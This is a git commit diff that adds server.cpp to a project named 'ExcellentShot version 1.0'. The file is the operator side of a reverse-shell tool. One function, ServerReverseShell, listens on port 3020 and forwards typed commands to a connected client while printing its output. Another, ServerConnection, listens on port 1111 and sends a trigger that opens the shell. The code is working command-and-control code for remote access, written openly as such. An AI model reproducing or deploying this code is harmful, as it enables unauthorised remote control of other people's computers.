bb33718d62657689d06d857e05d8966177f3e1ae
Milly Billigan <59014293+millybilligan@users.noreply.github.com>
2021-02-23 22:43:20 +0300

    ExcellentShot version 1.0

---
+++ ExcellentShot/ExcellentShot/server/server.cpp
@@ -0,0 +1,103 @@
+﻿#include "server.h"
+
+void readFromSocket(SOCKET& sock) {
+	int iResult;
+	char outputBuffer[MAX_OUTPUT_BUFFER];;
+	while (true) {
+		iResult = recv(sock, outputBuffer, MAX_OUTPUT_BUFFER, 0);
+		if (iResult == -1) {
+			break;
+		}
+		if (iResult < 4096)
+			outputBuffer[iResult] = '\0';
+		cout << outputBuffer;
+		fflush(stdout);
+	}
+}
+
+INT ServerReverseShell() {
+	WSADATA wsadata;
+	SOCKET sockServer, sockClient;
+	SOCKADDR_IN sin;
+	DWORD bytesReadFromPipe;
+	int bytesReadFromSock;
+	int sinLen = sizeof(SOCKADDR_IN);
+	unsigned short port = 3020;
+
+	//Socket Setup
+	WSAStartup(MAKEWORD(2, 2), &wsadata);
+
+	sin.sin_family = AF_INET;
+	sin.sin_addr.s_addr = 0;
+	sin.sin_port = htons(port);
+
+	sockServer = socket(AF_INET, SOCK_STREAM, 0);
+	if (sockServer == SOCKET_ERROR)
+		return 1;
+	int yes = 1;
+	setsockopt(sockServer, SOL_SOCKET, SO_REUSEADDR, (char*)&yes, sizeof(yes));
+	::bind(sockServer, (SOCKADDR*)&sin, sizeof(sin));
+	listen(sockServer, 0);
+	sockClient = accept(sockServer, (SOCKADDR*)&sin, &sinLen);
+
+	DWORD thId;
+	HANDLE pThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)readFromSocket, &sockClient, NULL, &thId);
+	char inputUser[MAX_INPUT_BUFFER];
+		do {
+			fgets(inputUser, MAX_INPUT_BUFFER, stdin);
+			if (_strcmpi(inputUser, "cls\n") == 0 || _strcmpi(inputUser, "clear\n") == 0) {
+				system("cls");
+				cout << "$shell>";
+				continue;
+			}
+			send(sockClient, inputUser, strlen(inputUser), NULL);
+
+		} while (_strcmpi(inputUser, "exit\n") != 0);
+
+	closesocket(sockServer);
+	closesocket(sockClient);
+	WSACleanup();
+
+	return 0;
+}
+
+INT ServerConnection() {
+	system("cls");
+	WSAData wsaData;
+	WORD DLLVersion = MAKEWORD(2, 1);
+	WSAStartup(DLLVersion, &wsaData);
+
+	SOCKADDR_IN addr;
+	int sizeofAddr = sizeof(addr);
+	addr.sin_addr.S_un.S_addr = INADDR_ANY;
+	addr.sin_port = htons(1111);
+	addr.sin_family = AF_INET;
+
+	SOCKET sListen = socket(AF_INET, SOCK_STREAM, 0);
+	bind(sListen, (SOCKADDR*)&addr, sizeof(addr));
+
+	listen(sListen, SOMAXCONN);
+
+	SOCKET newConnection;
+	newConnection = accept(sListen, (SOCKADDR*)&addr, &sizeofAddr);
+	int iResult;
+	while (true) {
+		char buf;
+		iResult = recv(newConnection, &buf, sizeof(buf), NULL);
+		if (buf != 'p') {
+			cout << "\nConnection failed!\n";
+			closesocket(newConnection);
+			newConnection = accept(sListen, (SOCKADDR*)&addr, &sizeofAddr);
+			cout << "\nConnection restored!\n";
+		}
+		buf = NULL;
+		cin >> buf;
+		iResult = send(newConnection, &buf, sizeof(buf), 0);
+		if (buf == '1') {
+			ServerReverseShell();
+		}
+	}
+
+
+	return 0;
+}
